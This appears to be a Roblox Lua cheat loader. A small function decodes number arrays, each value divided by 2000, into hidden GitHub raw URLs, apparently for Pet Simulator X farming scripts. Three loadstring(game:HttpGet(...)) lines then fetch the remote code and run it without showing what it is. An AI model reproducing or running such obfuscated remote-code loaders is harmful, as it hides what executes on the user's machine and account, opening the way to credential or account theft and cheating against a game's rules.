function zrFHFwOYVw(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/2000)end return res end 


loadstring(game:HttpGet(zrFHFwOYVw({208000,232000,232000,224000,230000,116000,94000,94000,228000,194000,238000,92000,206000,210000,232000,208000,234000,196000,234000,230000,202000,228000,198000,222000,220000,232000,202000,220000,232000,92000,198000,222000,218000,94000,194000,228000,222000,218000,230000,232000,228000,222000,220000,206000,194000,90000,234000,210000,94000,196000,216000,194000,198000,214000,90000,230000,198000,228000,202000,202000,220000,94000,228000,202000,204000,230000,94000,208000,202000,194000,200000,230000,94000,218000,194000,210000,220000,94000,230000,198000,228000,202000,202000,220000})))()

wait(1)

loadstring(game:HttpGet(zrFHFwOYVw({208000,232000,232000,224000,230000,116000,94000,94000,228000,194000,238000,92000,206000,210000,232000,208000,234000,196000,234000,230000,202000,228000,198000,222000,220000,232000,202000,220000,232000,92000,198000,222000,218000,94000,194000,228000,222000,218000,230000,232000,228000,222000,220000,206000,194000,90000,234000,210000,94000,224000,230000,240000,90000,204000,194000,228000,218000,94000,228000,202000,204000,230000,94000,208000,202000,194000,200000,230000,94000,218000,194000,210000,220000,94000,164000,210000,204000,232000})))()

wait(1)

loadstring(game:HttpGet(zrFHFwOYVw({208000,232000,232000,224000,230000,116000,94000,94000,228000,194000,238000,92000,206000,210000,232000,208000,234000,196000,234000,230000,202000,228000,198000,222000,220000,232000,202000,220000,232000,92000,198000,222000,218000,94000,194000,228000,222000,218000,230000,232000,228000,222000,220000,206000,194000,90000,234000,210000,94000,224000,230000,240000,90000,234000,220000,230000,222000,234000,220000,200000,94000,228000,202000,204000,230000,94000,208000,202000,194000,200000,230000,94000,218000,194000,210000,220000,94000,224000,230000,240000})))()    
